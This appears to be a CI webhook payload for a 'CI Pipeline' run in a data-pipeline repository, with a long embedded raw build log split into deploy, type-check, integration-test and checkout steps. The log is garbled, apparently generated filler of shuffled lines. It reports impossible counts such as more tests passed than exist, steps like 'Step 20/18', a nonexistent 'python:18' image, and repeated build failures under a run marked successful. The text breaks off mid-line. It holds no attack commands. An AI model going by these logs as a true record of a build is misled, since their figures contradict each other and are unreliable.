{
  "action": "completed",
  "workflow_run": {
    "id": 458,
    "name": "CI Pipeline",
    "head_branch": "main",
    "head_sha": "dba28777d1daecfd267cd440d77596403c81dc37",
    "status": "completed",
    "conclusion": "success",
    "run_started_at": "2025-12-04T12:46:50.920900Z",
    "updated_at": "2025-12-04T12:49:45.203168Z"
  },
  "repository": {
    "full_name": "acme-corp/data-pipeline",
    "name": "data-pipeline"
  },
  "sender": {
    "login": "grace"
  },
  "_safeops_extended": {
    "raw_logs": "=== Step: deploy_staging ===\n[12:46:50] DEBUG: Connection pool: 3 active\nCompleted.\n  PASS: unit/test_auth_login.spec.js\nStep 17/23: Linting\nTests: 476 passed, 238 total\nCompiling utils/main.py...\nStep 2/17: Installing dependencies\n  PASS: integration/test_cache_hit.spec.js\nSnapshots: 23 passed, 24 total\nnpm install: resolved 1408 packages\n[12:46:50] INFO: Request completed\nUsing Python 3.12\nLayer 2/10: ENV command\nMinifying app.js\nFetching submodules...\n[12:46:50] INFO: Starting build process\n[12:46:50] ERROR: Connection failed\n\u2713 Step 'install' succeeded\nRan 168 tests in 5s\n[12:46:50] WARN: Deprecated API usage\n[12:46:50] DEBUG: Connection pool: 18 active\nStep 3/16: Deploying\nCache hit for key-5279\n[12:46:50] INFO: Request completed\nStep 9/21: Installing dependencies\nSuccess!\nnpm notice: package.json updated\n\u2713 Task completed in 4129ms\nUploading artifact 'coverage' (23 files)\nPushing to registry...\nBuilding Docker image...\nLayer 7/9: RUN command\nConnection established\nEnvironment: development\nReady.\nProcessing...\n  PASS: integration/test_user_create.spec.js\nArtifact downloaded: 22MB\nWARNING: lodash has known vulnerabilities\n[12:46:50] INFO: Request completed\nWaiting...\nyarn add: Done in 13.57s\n[12:46:50] DEBUG: Initializing service\n[12:46:50] INFO: Cache refreshed\nReady.\nCache saved successfully\nnpm notice: created a lockfile\n\u26a0 DEPRECATION: Feature will be removed in v5.0\n[12:46:50] WARN: Deprecated API usage\nFetching submodules...\nPushing to registry...\n[12:46:50] INFO: Processing request\n[12:46:50] WARN: Deprecated API usage\nStep 1/18: Running migrations\nSwitched to branch 'bugfix/task-992'\nCreating production build...\nUploading artifact 'build' (23 files)\n\u2717 build failed with exit code 47\n[12:46:50] WARN: Deprecated API usage\nFetching submodules...\nWaiting...\n[12:46:50] INFO: Request completed\nAlready up to date.\nTLS handshake completed\nVerifying...\nArtifact uploaded: build.tar.gz (1MB)\n\u26a0 DEPRECATION: Feature will be removed in v2.0\n[12:46:50] WARN: Deprecated API usage\nFinished.\nCache hit for key-7786\nSnapshots: 43 passed, 35 total\nnpm notice: created a lockfile\nSwitched to branch 'hotfix/task-577'\n[12:46:50] WARN: Deprecated API usage\n\u2713 build completed\nArtifact uploaded: dist.zip (98MB)\n[12:46:50] DEBUG: Loading configuration\nStep 20/18: Linting\nBuilding Docker image...\nPOST /upload - 201 (16ms)\nException: NullPointerException\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nnpm notice: created a lockfile\n[12:46:50] INFO: Request completed\nGET /status - 201 (77ms)\nStep 15/19: Testing\nCompiling src/index.js...\nCompleted.\nSwitched to branch 'hotfix/task-934'\nCompleted.\nInstalling eslint@5.19.1\n[12:46:50] WARN: Deprecated API usage\npip: Collecting react\n[12:46:50] ERROR: Connection failed\nUploading artifact 'build' (47 files)\nHEAD is now at 955151b\nProcessing...\n[12:46:50] DEBUG: Connection pool: 20 active\nyarn add: Done in 7.69s\nOK\n[12:46:50] DEBUG: Query executed in 26ms\nCreating production build...\nVerifying...\nPushing to registry...\n[12:46:50] WARN: Deprecated API usage\nFinished.\nNODE_ENV=development\npip install: Successfully installed prettier-4.10\nGenerating source maps...\nStep 14/19: Deploying\nInstalling axios@3.7.3\nGET /api - 201 (90ms)\n  PASS: test_user_create (464ms)\n[12:46:50] INFO: Request completed\nCompiling components/app.ts...\nTransforming 947 files...\nStep 9/20: Building\nCache miss for key-3166\nGET /status - 201 (85ms)\nStep 10/19: Linting\nBundling vendor.js\nSuccess!\nCache invalidated: build\nRan 192 tests in 5s\nLayer 9/9: ENV command\nCompiling lib/utils.go...\nReady.\nCompiling src/handler.rs...\nHEAD is now at 632b3f3\nStep 16/16: Installing dependencies\npip: Downloading prettier-3.0.tar.gz\nRan 30 tests in 19s\nTime: 48.436s\n\u2713 lint completed\n\u2717 build failed with exit code 50\npip: Downloading eslint-2.1.tar.gz\nWARNING: webpack has known vulnerabilities\nArtifact uploaded: dist.zip (97MB)\nUsing Python 3.10\nOK\nStep 3/16: Building\nChecking out develop branch\nTime: 61.150s\n\u2713 All checks passed\nBuilding Docker image...\nCompiling lib/app.ts...\nRan 58 tests in 50s\n\u26a0 DEPRECATION: Feature will be removed in v4.0\n  PASS: integration/test_auth_login.spec.js\nLayer 10/9: ENV command\n[12:46:50] WARN: Deprecated API usage\nBundling vendor.js\nOptimizing 64 modules...\nOptimizing 55 modules...\nPulling image: python:18\npip install: Successfully installed jest-5.16\nStep 13/23: Running migrations\n[12:46:50] INFO: Request completed\n[12:46:50] WARN: Deprecated API usage\nRan 161 tests in 11s\nLoading...\nBundling runtime.css\nCache hit for key-2755\nNODE_ENV=development\nFinished.\n[12:46:50] DEBUG: Initializing service\nWARNING: lodash has known vulnerabilities\n[12:46:50] ERROR: Connection failed\nFinished.\nCache miss for key-3621\nGET /health - 201 (68ms)\n[12:46:50] DEBUG: Connection pool: 20 active\nException: TypeError\nRan 89 tests in 27s\nPOST /upload - 200 (352ms)\nGET /status - 201 (70ms)\nCompiling utils/service.java...\nCache restored successfully (105MB)\nConnection established\nStep 14/17: Installing dependencies\nFetching from https://github.com/package.json\nCache miss for key-7771\nImage pulled successfully\nConnection established\nTests: 336 passed, 466 total\npip: Installing build dependencies...\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nReady.\nCache invalidated: node_modules\nArtifact downloaded: 40MB\nTransforming 800 files...\nChecking out main branch\nOK\n[12:46:50] INFO: Connecting to database\nCache hit for key-2635\n[12:46:50] INFO: Processing request\nStep 4/18: Testing\npip: Downloading webpack-1.8.tar.gz\nUploading artifact 'coverage' (19 files)\nWARNING: react has known vulnerabilities\n[12:46:50] DEBUG: Loading configuration\nFinished.\n[12:46:50] WARN: Deprecated API usage\nWARNING: lodash has known vulnerabilities\n\u2713 Step 'checkout' succeeded\nyarn add: Done in 2.97s\nTLS handshake completed\nUsing Python 3.9\nBundling main.css\nCreating production build...\nArtifact downloaded: 32MB\nFetching submodules...\nSwitched to branch 'feature/task-130'\nFetching from https://amazonaws.com/package.json\nDone.\nOptimizing 26 modules...\nBuilding Docker image...\n=== Step deploy_staging completed ===\n=== Step: type_check ===\nCompiling components/app.ts...\n\u2713 Step 'test' succeeded\n[12:46:50] INFO: Processing request\n[12:46:50] DEBUG: Query executed in 64ms\nCompiling utils/service.java...\nFAILED: test_cache_hit\n[12:46:50] DEBUG: Initializing service\nChecking out main branch\nCache miss for key-2070\nCompiling src/service.java...\n[12:46:50] WARN: Deprecated API usage\n  PASS: test_db_connect (7ms)\nCache restored successfully (183MB)\nCompiling components/service.java...\nStep 2/19: Testing\nCoverage: 93% statements, 67% branches\n\u2713 Step 'test' succeeded\nHEAD is now at a241da2\n[12:46:50] INFO: Request completed\nMinifying main.js\nnpm notice: created a lockfile\nCompiling components/service.java...\nCache restored successfully (214MB)\n\u2713 validate completed\nUsing Python 3.11\n[12:46:50] DEBUG: Query executed in 19ms\nCache hit for key-8500\nTransforming 686 files...\nDone.\n\u2713 Step 'build' succeeded\nRan 20 tests in 13s\n[12:46:50] INFO: Starting build process\nPulling image: alpine:latest\nWaiting...\nTest Suites: 31 passed, 23 total\n  PASS: unit/test_cache_hit.spec.js\nBundling vendor.js\nMinifying app.js\nSuccess!\npip: Downloading axios-5.10.tar.gz\nMinifying main.js\npip: Collecting express\nFAILED: test_db_connect\nTLS handshake completed\nSnapshots: 19 passed, 15 total\nCoverage: 83% statements, 72% branches\nProcessing...\n\u2713 Task completed in 4529ms\nCreating production build...\nCompiling lib/utils.go...\nInstalling axios@3.1.4\nFetching from https://githubusercontent.com/package.json\nGenerating source maps...\nHEAD is now at 229bdf5\nArtifact uploaded: dist.zip (57MB)\n[12:46:50] INFO: Processing request\nImage pulled successfully\nReady.\n[12:46:50] WARN: Deprecated API usage\nPulling image: alpine:3.11\nStep 12/25: Linting\nCompiling utils/main.py...\npip: Downloading axios-1.6.tar.gz\n\u2713 Task completed in 1550ms\nnpm notice: package.json updated\n[12:46:50] DEBUG: Loading configuration\nCreating production build...\n[12:46:50] INFO: Request completed\nOptimizing 38 modules...\nCompleted.\n[12:46:50] WARN: Deprecated API usage\nConnection established\nGenerating source maps...\nProcessing...\nTests: 167 passed, 138 total\n[12:46:50] DEBUG: Connection pool: 12 active\nImage pulled successfully\nStep 3/19: Installing dependencies\nWARNING: axios has known vulnerabilities\n[12:46:50] WARN: Deprecated API usage\nWaiting...\nUsing Node.js 15.9.2\n  PASS: unit/test_auth_login.spec.js\nnpm notice: package.json updated\nStep 14/19: Installing dependencies\nnpm notice: package.json updated\nTest Suites: 16 passed, 40 total\nOK\n[12:46:50] DEBUG: Initializing service\nReady.\nImage pulled successfully\nStep 7/23: Linting\n[12:46:50] INFO: Starting build process\nCompiling components/handler.rs...\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nOK\nCompiling utils/service.java...\nBuilding Docker image...\n[12:46:50] DEBUG: Memory usage: 104MB\nOptimizing 16 modules...\nnpm install: resolved 360 packages\nSuccess!\nCoverage: 81% statements, 100% branches\nTLS handshake completed\n[12:46:50] DEBUG: Query executed in 63ms\nGET /api - 200 (67ms)\nSuccess!\nFinished.\nOK\nCache invalidated: dependencies\nArtifact uploaded: build.tar.gz (12MB)\nnpm install: resolved 428 packages\n[12:46:50] DEBUG: Initializing service\nTransforming 752 files...\n[12:46:50] WARN: Deprecated API usage\n[12:46:50] INFO: Processing request\nArtifact uploaded: dist.zip (99MB)\nCompiling utils/handler.rs...\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nStep 5/24: Building\n[12:46:50] ERROR: Connection failed\n[12:46:50] DEBUG: Connection pool: 9 active\nWaiting...\nSnapshots: 41 passed, 34 total\nTransforming 670 files...\nMinifying vendor.js\n  PASS: test_api_health (345ms)\nDone.\n[12:46:50] WARN: Deprecated API usage\nnpm notice: package.json updated\nMinifying app.js\nPOST /data - 200 (496ms)\nCreating production build...\nPushing to registry...\nCompleted.\nNODE_ENV=development\nEnvironment: development\nGET /health - 204 (64ms)\nWARNING: jest has known vulnerabilities\nBundling vendor.js\nUsing Node.js 16.1.3\npip: Downloading prettier-2.10.tar.gz\nFetching submodules...\nLoading...\nVerifying...\npip: Collecting lodash\nCompiling utils/utils.go...\nOK\nTransforming 708 files...\n\u2713 Step 'checkout' succeeded\nnpm install: resolved 1561 packages\nArtifact uploaded: dist.zip (69MB)\nCompiling src/app.ts...\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nAlready up to date.\n[12:46:50] WARN: Deprecated API usage\nFinished.\nUploading artifact 'build' (5 files)\npip: Downloading webpack-5.4.tar.gz\n[12:46:50] INFO: Starting build process\nStep 13/17: Linting\nFetching submodules...\nnpm notice: created a lockfile\n[12:46:50] INFO: Processing request\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nWARNING: eslint has known vulnerabilities\nFetching submodules...\n[12:46:50] DEBUG: Connection pool: 9 active\nFetching from https://googleapis.com/package.json\nException: RuntimeError\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nOptimizing 16 modules...\n[12:46:50] INFO: Cache refreshed\n  PASS: test_db_connect (417ms)\npip install: Successfully installed webpack-3.13\nProcessing...\nStep 15/21: Installing dependencies\nCache invalidated: dependencies\nSnapshots: 14 passed, 1 total\nDone.\n\u2713 build completed\n  PASS: test_api_health (311ms)\nnpm install: resolved 342 packages\nAlready up to date.\nCache hit for key-7900\nCoverage: 88% statements, 88% branches\npip: Downloading react-2.3.tar.gz\nSuccess!\nVerifying...\nStep 11/20: Deploying\nDone.\n[12:46:50] DEBUG: Memory usage: 1974MB\nOK\nCache invalidated: dependencies\nNODE_ENV=test\nBuilding Docker image...\n[12:46:50] INFO: Processing request\nUsing Python 3.9\nOptimizing 34 modules...\n[12:46:50] DEBUG: Connection pool: 15 active\nnpm notice: created a lockfile\nProcessing...\npip: Installing build dependencies...\nnpm notice: package.json updated\nnpm notice: created a lockfile\nGenerating source maps...\n[12:46:50] DEBUG: Initializing service\nUploading artifact 'coverage' (47 files)\nFetching from https://pypi.org/package.json\n\u2713 validate completed\nTime: 2.544s\nCompleted.\nChecking out develop branch\nTransforming 337 files...\nCompiling utils/main.py...\nWaiting...\nAlready up to date.\n=== Step type_check completed ===\n=== Step: integration_tests ===\nCoverage: 89% statements, 94% branches\nStep 2/23: Testing\n[12:46:50] DEBUG: Query executed in 62ms\nWARNING: prettier has known vulnerabilities\n  PASS: test_api_health (397ms)\nPushing to registry...\nCompiling components/app.ts...\nTransforming 248 files...\nSuccess!\nCreating production build...\nBundling styles.js\nImage pulled successfully\nWARNING: eslint has known vulnerabilities\n[12:46:50] DEBUG: Initializing service\n\u2717 build failed with exit code 58\n\u2713 Step 'checkout' succeeded\n[12:46:50] DEBUG: Memory usage: 1992MB\nCache invalidated: dependencies\nVerifying...\nFetching from https://githubusercontent.com/package.json\nPushing to registry...\nLayer 5/13: ENV command\npip: Collecting axios\nCompleted.\nArtifact uploaded: build.tar.gz (27MB)\n[12:46:50] DEBUG: Loading configuration\nCache restored successfully (96MB)\nImage pulled successfully\nMinifying app.js\nLoading...\n[12:46:50] DEBUG: Connection pool: 15 active\nFinished.\nCompiling src/main.py...\nFetching submodules...\nLayer 9/15: COPY command\n[12:46:50] INFO: Connecting to database\nCache hit for key-2071\n  PASS: test_db_connect (428ms)\nLayer 1/15: COPY command\npip install: Successfully installed react-3.15\nArtifact uploaded: dist.zip (49MB)\nArtifact uploaded: build.tar.gz (12MB)\nTLS handshake completed\nnpm install: added 348 packages\nWARNING: react has known vulnerabilities\nCompleted.\nStep 8/21: Running migrations\nArtifact downloaded: 48MB\n[12:46:50] INFO: Connecting to database\nTest Suites: 26 passed, 27 total\n[12:46:50] INFO: Request completed\nProcessing...\nTest Suites: 15 passed, 29 total\npip: Collecting webpack\nDone.\nPlatform: darwin-arm64\nOptimizing 67 modules...\n[12:46:50] DEBUG: Initializing service\n\u2717 build failed with exit code 127\nCreating production build...\nChecking out develop branch\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nLayer 9/14: RUN command\nTests: 344 passed, 364 total\nNODE_ENV=development\nTLS handshake completed\nPushing to registry...\nFetching submodules...\nWARNING: prettier has known vulnerabilities\n[12:46:50] DEBUG: Initializing service\nPulling image: node:3.11\nWARNING: react has known vulnerabilities\nUsing Node.js 19.0.2\n[12:46:50] DEBUG: Query executed in 95ms\nCache invalidated: node_modules\nImage pulled successfully\nCreating production build...\nFetching submodules...\nFAILED: test_db_connect\n\u26a0 DEPRECATION: Feature will be removed in v2.0\n\u2713 All checks passed\n\u2713 Task completed in 4705ms\nUploading artifact 'build' (17 files)\nHEAD is now at af6e74e\nOptimizing 73 modules...\npip install: Successfully installed webpack-1.2\nProcessing...\nRan 148 tests in 58s\nCompiling utils/handler.rs...\nDone.\n\u26a0 DEPRECATION: Feature will be removed in v3.0\npip: Installing build dependencies...\nnpm install: added 383 packages\n[12:46:50] INFO: Starting build process\nRan 148 tests in 7s\nFinished.\n[12:46:50] ERROR: Connection failed\nBundling styles.js\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nFAILED: test_cache_hit\nException: ValueError\nnpm install: added 56 packages\nConnection established\npip: Installing build dependencies...\nFinished.\nChecking out master branch\nEnvironment: test\n[12:46:50] DEBUG: Memory usage: 899MB\n\u2713 test completed\npip: Collecting webpack\n[12:46:50] INFO: Cache refreshed\n[12:46:50] DEBUG: Connection pool: 19 active\n[12:46:50] INFO: Request completed\nHEAD is now at 0781108\nCompleted.\n[12:46:50] DEBUG: Loading configuration\nChecking out develop branch\nnpm install: resolved 1562 packages\nImage pulled successfully\nAlready up to date.\nCache restored successfully (308MB)\nPlatform: darwin-arm64\nWaiting...\nChecking out develop branch\nFetching submodules...\nWARNING: express has known vulnerabilities\nDone.\nTest Suites: 43 passed, 30 total\n[12:46:50] DEBUG: Connection pool: 13 active\n[12:46:50] INFO: Request completed\nDone.\nLoading...\nTime: 120.367s\nProcessing...\nChecking out main branch\nWaiting...\nSuccess!\nGET /health - 200 (66ms)\nUsing Node.js 20.20.3\nLoading...\n[12:46:50] INFO: Starting build process\n[12:46:50] INFO: Cache refreshed\nLoading...\nVerifying...\nSnapshots: 41 passed, 10 total\nCompiling utils/main.py...\nCache restored successfully (91MB)\n  PASS: test_cache_hit (119ms)\nTime: 13.719s\n[12:46:50] INFO: Cache refreshed\nLayer 2/9: COPY command\nCompiling lib/handler.rs...\npip: Installing build dependencies...\nCompiling src/utils.go...\nPlatform: linux-x64\nOK\nMinifying main.js\nGET /status - 200 (76ms)\nOptimizing 72 modules...\npip: Collecting webpack\nnpm notice: created a lockfile\nPushing to registry...\nWARNING: eslint has known vulnerabilities\n\u2713 lint completed\nWARNING: jest has known vulnerabilities\nAlready up to date.\n\u2713 Step 'checkout' succeeded\n[12:46:50] INFO: Connecting to database\nSwitched to branch 'bugfix/task-660'\n[12:46:50] DEBUG: Query executed in 86ms\n[12:46:50] DEBUG: Connection pool: 9 active\nnpm install: added 318 packages\n  PASS: integration/test_cache_hit.spec.js\nStep 15/23: Testing\n\u2713 Task completed in 4743ms\nMinifying app.js\nCompiling components/app.ts...\nWaiting...\nVerifying...\nStep 5/21: Running migrations\nSuccess!\nArtifact uploaded: build.tar.gz (21MB)\nLayer 2/8: ENV command\n  PASS: test_cache_hit (136ms)\nImage pulled successfully\n[12:46:50] DEBUG: Loading configuration\n\u2713 Step 'test' succeeded\nException: NullPointerException\nnpm notice: package.json updated\nCache saved successfully\nBuilding Docker image...\nCreating production build...\nnpm notice: created a lockfile\n\u2717 build failed with exit code 40\nTest Suites: 14 passed, 47 total\nArtifact uploaded: dist.zip (25MB)\nWARNING: axios has known vulnerabilities\nGenerating source maps...\nImage pulled successfully\nFAILED: test_user_create\nStep 5/20: Testing\n[12:46:50] DEBUG: Memory usage: 331MB\nCompiling lib/service.java...\nMinifying vendor.js\npip: Downloading eslint-1.3.tar.gz\n[12:46:50] INFO: Cache refreshed\nCompiling utils/index.js...\nStep 19/16: Testing\n\u2713 Task completed in 132ms\n[12:46:50] INFO: Request completed\nCache invalidated: build\nStep 14/22: Installing dependencies\n[12:46:50] WARN: Deprecated API usage\nFetching submodules...\n[12:46:50] ERROR: Connection failed\nNODE_ENV=development\nReady.\n=== Step integration_tests completed ===\n=== Step: checkout ===\nTest Suites: 37 passed, 15 total\nPulling image: node:latest\n[12:46:50] WARN: Deprecated API usage\nFetching from https://docker.io/package.json\nTime: 111.253s\nPOST /upload - 202 (94ms)\nSnapshots: 14 passed, 15 total\nSuccess!\nFetching from https://npmjs.org/package.json\nArtifact uploaded: build.tar.gz (2MB)\nStep 15/19: Testing\nnpm install: resolved 1716 packages\n[12:46:50] DEBUG: Memory usage: 1346MB\n\u2713 lint completed\nArtifact downloaded: 32MB\n\u2713 All checks passed\npip install: Successfully installed jest-4.8\nArtifact uploaded: dist.zip (2MB)\nDone.\nStep 5/22: Deploying\nImage pulled successfully\nStep 5/23: Linting\nTest Suites: 30 passed, 47 total\nUsing Node.js 14.18.2\nStep 20/22: Linting\nCache saved successfully\n  PASS: test_auth_login (246ms)\nSnapshots: 33 passed, 38 total\n[12:46:50] WARN: Deprecated API usage\nUploading artifact 'dist' (2 files)\nSuccess!\nCache invalidated: build\nImage pulled successfully\npip install: Successfully installed express-2.2\nOK\nImage pulled successfully\nChecking out main branch\n[12:46:50] INFO: Processing request\nTLS handshake completed\n\u2713 Task completed in 1293ms\nLoading...\n[12:46:50] WARN: Deprecated API usage\nSnapshots: 8 passed, 26 total\nConnection established\nChecking out master branch\nEnvironment: staging\nCache restored successfully (415MB)\nTransforming 935 files...\n\u2713 Task completed in 1250ms\nUploading artifact 'dist' (8 files)\nCache invalidated: build\nTransforming 793 files...\nEnvironment: test\nTransforming 435 files...\nTests: 143 passed, 404 total\nSwitched to branch 'hotfix/task-299'\nCompiling utils/index.js...\nAlready up to date.\nLayer 9/12: ENV command\nTime: 14.138s\nCompiling src/index.js...\nPlatform: win32-x64\npip: Collecting eslint\n  PASS: test_cache_hit (24ms)\nException: RuntimeError\nPulling image: alpine:18\nTime: 12.577s\n\u26a0 DEPRECATION: Feature will be removed in v2.0\n  PASS: unit/test_auth_login.spec.js\nInstalling eslint@1.7.9\nCompiling src/utils.go...\nVerifying...\n[12:46:50] INFO: Connecting to database\nnpm notice: created a lockfile\nRan 110 tests in 23s\n[12:46:50] INFO: Processing request\n[12:46:50] DEBUG: Connection pool: 6 active\nInstalling webpack@5.10.4\nBuilding Docker image...\nBuilding Docker image...\nUsing Python 3.10\nTests: 63 passed, 223 total\nTime: 89.257s\n[12:46:50] DEBUG: Query executed in 2ms\npip: Installing build dependencies...\nGenerating source maps...\nnpm notice: created a lockfile\n\u2713 All checks passed\nWARNING: express has known vulnerabilities\nCompiling utils/main.py...\nBundling main.js\nStep 9/15: Testing\n[12:46:50] INFO: Starting build process\nConnection established\n\u2713 package completed\nCache saved successfully\nMinifying app.js\nPOST /upload - 202 (78ms)\nStep 15/25: Building\nPlatform: linux-x64\nBundling styles.js\nSuccess!\nnpm install: resolved 1469 packages\nCache miss for key-4699\nLoading...\nWaiting...\n\u2713 Step 'install' succeeded\n[12:46:50] DEBUG: Connection pool: 4 active\nInstalling eslint@2.7.0\nCompiling lib/index.js...\n[12:46:50] INFO: Request completed\nReady.\nCache invalidated: node_modules\n[12:46:50] WARN: Deprecated API usage\nCache saved successfully\nyarn add: Done in 15.81s\n[12:46:50] WARN: Deprecated API usage\nRan 45 tests in 16s\n  PASS: test_auth_login (391ms)\nSuccess!\nFetching from https://docker.io/package.json\nnpm install: added 394 packages\npip: Downloading axios-3.12.tar.gz\npip: Collecting eslint\nCompiling lib/handler.rs...\n[12:46:50] INFO: Starting build process\npip install: Successfully installed webpack-5.6\nStep 19/17: Linting\nUploading artifact 'build' (24 files)\nnpm install: added 135 packages\nUsing Node.js 16.10.4\n\u2713 Step 'build' succeeded\nCompleted.\nnpm notice: package.json updated\nPulling image: python:18\n\u2713 deploy completed\nBundling main.js\n[12:46:50] INFO: Starting build process\n[12:46:50] INFO: Starting build process\nProcessing...\npip: Downloading jest-5.7.tar.gz\n[12:46:50] DEBUG: Connection pool: 10 active\nCache hit for key-1175\n[12:46:50] INFO: Processing request\nCache miss for key-9281\nUsing Python 3.10\nOptimizing 15 modules...\npip install: Successfully installed react-3.14\nCache saved successfully\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nCache miss for key-3382\nnpm install: added 226 packages\nConnection established\nWARNING: jest has known vulnerabilities\nPlatform: linux-x64\nOptimizing 94 modules...\nCompiling components/app.ts...\nTransforming 749 files...\nBuilding Docker image...\n[12:46:50] WARN: Deprecated API usage\nArtifact uploaded: dist.zip (13MB)\n\u2713 Task completed in 3352ms\n[12:46:50] DEBUG: Query executed in 82ms\nUploading artifact 'build' (28 files)\nAlready up to date.\n[12:46:50] INFO: Request completed\npip: Installing build dependencies...\nStep 7/21: Testing\nTransforming 361 files...\n[12:46:50] WARN: Deprecated API usage\nStep 11/18: Testing\nAlready up to date.\nTransforming 937 files...\nCompiling components/utils.go...\n[12:46:50] ERROR: Connection failed\nCache hit for key-3834\nFinished.\nCache saved successfully\nnpm install: resolved 1708 packages\nSnapshots: 19 passed, 35 total\nWARNING: eslint has known vulnerabilities\nTLS handshake completed\n[12:46:50] INFO: Processing request\nFinished.\nCache miss for key-2532\nCache restored successfully (170MB)\nFAILED: test_api_health\n[12:46:50] DEBUG: Memory usage: 1712MB\nCompiling utils/index.js...\nMinifying main.js\nCache miss for key-3505\nUploading artifact 'dist' (39 files)\nException: ValueError\nCompiling utils/service.java...\nCompiling utils/service.java...\nVerifying...\nCoverage: 96% statements, 69% branches\nAlready up to date.\n[12:46:50] INFO: Connecting to database\nWaiting...\nSnapshots: 31 passed, 35 total\nWARNING: eslint has known vulnerabilities\nGET /health - 204 (81ms)\npip: Downloading prettier-1.15.tar.gz\n\u2717 build failed with exit code 117\nImage pulled successfully\nPOST /data - 202 (447ms)\nTests: 228 passed, 71 total\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nFetching from https://googleapis.com/package.json\nWaiting...\nHEAD is now at 348497b\nConnection established\nOptimizing 61 modules...\nnpm install: resolved 799 packages\nFinished.\nnpm notice: package.json updated\n=== Step checkout completed ===\n=== Step: deploy_production ===\nPulling image: alpine:latest\n[12:46:50] ERROR: Connection failed\nFinished.\nBundling styles.js\nArtifact uploaded: build.tar.gz (3MB)\n[12:46:50] DEBUG: Connection pool: 13 active\nNODE_ENV=test\nFetching submodules...\nStep 18/24: Building\n  PASS: integration/test_user_create.spec.js\nArtifact downloaded: 3MB\nStep 1/18: Linting\nChecking out develop branch\nUsing Node.js 16.13.7\nPulling image: alpine:latest\nPOST /upload - 201 (482ms)\n[12:46:50] INFO: Starting build process\n\u2713 deploy completed\nReady.\nCache restored successfully (127MB)\nHEAD is now at 739d88b\nStep 5/19: Building\nFetching submodules...\nTime: 91.48s\n[12:46:50] WARN: Deprecated API usage\n[12:46:50] WARN: Deprecated API usage\npip: Installing build dependencies...\nWaiting...\nStep 12/19: Deploying\nCompiling utils/app.ts...\npip: Downloading express-5.3.tar.gz\nTransforming 670 files...\n[12:46:50] WARN: Deprecated API usage\nHEAD is now at 8e67d4b\nCompiling lib/utils.go...\nPushing to registry...\nReady.\nArtifact downloaded: 13MB\npip: Collecting axios\nCache invalidated: node_modules\nGenerating source maps...\n[12:46:50] DEBUG: Memory usage: 1643MB\nCompiling components/service.java...\nCache miss for key-3017\nTransforming 316 files...\n\u2713 Step 'checkout' succeeded\n  PASS: test_user_create (476ms)\nLayer 10/8: ENV command\nPulling image: python:18\nnpm install: resolved 1097 packages\nArtifact uploaded: dist.zip (37MB)\n\u2713 Step 'checkout' succeeded\nArtifact uploaded: build.tar.gz (11MB)\n[12:46:50] WARN: Deprecated API usage\nStep 16/19: Building\n\u2717 build failed with exit code 62\nStep 13/16: Testing\n  PASS: test_cache_hit (83ms)\nCache miss for key-9564\nMinifying vendor.js\nCoverage: 89% statements, 76% branches\nCompleted.\nStep 5/24: Linting\nDone.\nTLS handshake completed\nnpm notice: created a lockfile\n\u2713 All checks passed\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nPlatform: darwin-arm64\n[12:46:50] INFO: Request completed\nFetching from https://githubusercontent.com/package.json\n\u2713 All checks passed\n  PASS: integration/test_user_create.spec.js\nStep 1/15: Building\nCoverage: 77% statements, 90% branches\nEnvironment: test\nBundling runtime.css\nConnection established\nWARNING: eslint has known vulnerabilities\nGET /health - 200 (54ms)\nFinished.\nMinifying main.js\n[12:46:50] WARN: Deprecated API usage\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nWaiting...\npip: Collecting lodash\nStep 10/19: Building\nnpm install: resolved 575 packages\nCompiling utils/index.js...\n  PASS: test_api_health (402ms)\n\u2713 All checks passed\n[12:46:50] INFO: Processing request\nNODE_ENV=test\n[12:46:50] INFO: Processing request\nStep 1/23: Installing dependencies\nStep 12/24: Running migrations\nOK\nCompleted.\nnpm notice: package.json updated\n[12:46:50] INFO: Connecting to database\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nGET /status - 201 (69ms)\n[12:46:50] DEBUG: Memory usage: 1007MB\nCache saved successfully\nAlready up to date.\nStep 13/24: Installing dependencies\nInstalling prettier@4.18.2\nStep 16/22: Installing dependencies\nCompleted.\n[12:46:50] WARN: Deprecated API usage\nGET /health - 204 (91ms)\nCache restored successfully (132MB)\nUploading artifact 'coverage' (3 files)\npip: Installing build dependencies...\nStep 16/20: Deploying\nPOST /upload - 200 (182ms)\nSuccess!\nBuilding Docker image...\n\u2713 Step 'build' succeeded\nDone.\nRan 107 tests in 35s\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nTLS handshake completed\nHEAD is now at 704c110\n[12:46:50] DEBUG: Loading configuration\n  PASS: unit/test_api_health.spec.js\nWARNING: lodash has known vulnerabilities\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nCache miss for key-3010\nStep 9/24: Building\nnpm notice: created a lockfile\nnpm notice: created a lockfile\nLoading...\n[12:46:50] INFO: Cache refreshed\nCache miss for key-2985\nnpm notice: package.json updated\nTime: 49.615s\nPOST /data - 201 (303ms)\nRan 43 tests in 32s\nCache restored successfully (67MB)\nnpm install: added 15 packages\nCompiling src/index.js...\nSwitched to branch 'hotfix/task-820'\nInstalling axios@2.11.6\n\u2713 All checks passed\nTime: 96.133s\nFinished.\nVerifying...\nSuccess!\nTLS handshake completed\nWARNING: jest has known vulnerabilities\nnpm install: resolved 1218 packages\nReady.\npip: Downloading prettier-5.18.tar.gz\nLoading...\nStep 2/21: Building\nCache miss for key-7239\nWARNING: react has known vulnerabilities\npip: Collecting react\nArtifact uploaded: build.tar.gz (2MB)\nGET /health - 200 (54ms)\nCompiling lib/main.py...\n  PASS: test_api_health (444ms)\nWARNING: prettier has known vulnerabilities\nConnection established\nWaiting...\nPulling image: alpine:latest\nPlatform: darwin-arm64\nUsing Python 3.12\nTransforming 857 files...\nFinished.\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nMinifying vendor.js\nTLS handshake completed\nWaiting...\nArtifact downloaded: 37MB\nFAILED: test_cache_hit\n[12:46:50] ERROR: Connection failed\nProcessing...\nException: TypeError\nOK\nStep 5/20: Linting\nWARNING: axios has known 